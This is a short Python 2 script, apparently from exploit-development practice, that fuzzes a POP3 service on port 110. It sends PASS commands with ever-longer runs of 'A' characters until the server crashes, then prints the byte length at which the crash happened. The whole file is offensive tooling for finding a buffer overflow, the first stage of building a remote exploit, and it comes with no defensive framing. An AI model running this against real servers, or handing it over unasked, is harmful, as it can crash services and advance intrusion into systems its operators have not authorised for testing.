import socket
import sys

rhost = "192.168"
rport = 110

payload = ""
payload += "A" * 100

while True:
	try:
		print "Fuzzing with %s bytes..." % len(payload)
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((rhost,rport))
		s.recv(1024)
		s.send("USER test\r\n")
		s.recv(1024)
		s.send("PASS " + payload + "\r\n")
		s.recv(1024)
		s.send("QUIT")
		s.close()
		payload += "A"*100
	except:
		print "Oops! Something went wrong!"
		print "Fuzzing crashed at %s bytes" % len(payload)
		sys.exit()